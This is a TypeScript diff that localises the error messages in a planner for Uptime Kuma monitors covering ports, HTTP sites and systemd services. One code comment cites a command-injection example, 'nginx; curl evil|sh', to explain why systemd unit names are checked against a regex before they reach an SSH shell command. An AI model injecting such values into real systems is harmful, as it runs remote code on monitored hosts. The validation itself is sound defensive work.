@@ -1,3 +1,4 @@
+import { t } from '../i18n.js'
 import { shortGroup, type ServiceRule } from '../metrics/services.js'
 
 // 「添加主机」时顺带建观测项：三类模板 → kuma-monitor add 的 payload。
@@ -43,16 +44,16 @@ export function planMonitors(input: ProvisionInput): PlannedMonitor[] {
   if (input.port !== undefined && input.port !== null) {
     const port = input.port
     if (!Number.isInteger(port) || port < 1 || port > 65535) {
-      throw new Error('端口必须是 1–65535 的整数：' + String(port))
+      throw new Error(t('端口必须是 1–65535 的整数：{port}', { port: String(port) }))
     }
-    if (!address) throw new Error('缺少主机地址，端口探测没法建')
+    if (!address) throw new Error(t('缺少主机地址，端口探测没法建'))
     const name = monitorName(input.groupName, input.hostId, '端口 ' + port + '（TCP）')
     out.push({ name, payload: { type: 'port', name, hostname: address, port } })
   }
 
   if (input.http) {
     const url = String(input.http.url ?? '').trim()
-    if (!/^https?:\/\//i.test(url)) throw new Error('HTTP 站点地址要以 http:// 或 https:// 开头：' + url)
+    if (!/^https?:\/\//i.test(url)) throw new Error(t('HTTP 站点地址要以 http:// 或 https:// 开头：{url}', { url }))
     const name = monitorName(input.groupName, input.hostId, 'HTTP 站点')
     const keyword = String(input.http.keyword ?? '').trim()
     const payload: Record<string, unknown> = { type: 'http', name, url, method: 'GET', maxredirects: 10 }
@@ -63,13 +64,13 @@ export function planMonitors(input: ProvisionInput): PlannedMonitor[] {
   for (const svc of input.services || []) {
     const unit = String(svc.unit ?? '').trim()
     const ssh = svc.ssh
-    if (!unit) throw new Error('systemd 服务缺单元名')
+    if (!unit) throw new Error(t('systemd 服务缺单元名'))
     // unit 会拼进 ssh_command（'systemctl is-active ' + unit），Kuma 在目标机上按 shell 执行；
     // 不卡字符集的话 'nginx; curl evil|sh' 会真的跑起来（坑 49）。
-    if (!UNIT_RE.test(unit)) throw new Error('单元名只能是字母、数字、点、下划线、@、冒号、短横线：' + unit)
-    if (!address) throw new Error('缺少主机地址，systemd 探测没法建')
-    if (!ssh || !String(ssh.user ?? '').trim()) throw new Error('systemd 探测需要 SSH 用户名')
-    if (!String(ssh.key ?? '').trim()) throw new Error('systemd 探测需要 SSH 私钥内容')
+    if (!UNIT_RE.test(unit)) throw new Error(t('单元名只能是字母、数字、点、下划线、@、冒号、短横线：{unit}', { unit }))
+    if (!address) throw new Error(t('缺少主机地址，systemd 探测没法建'))
+    if (!ssh || !String(ssh.user ?? '').trim()) throw new Error(t('systemd 探测需要 SSH 用户名'))
+    if (!String(ssh.key ?? '').trim()) throw new Error(t('systemd 探测需要 SSH 私钥内容'))
     const name = monitorName(input.groupName, input.hostId, unit + ' 服务')
     out.push({
       name,
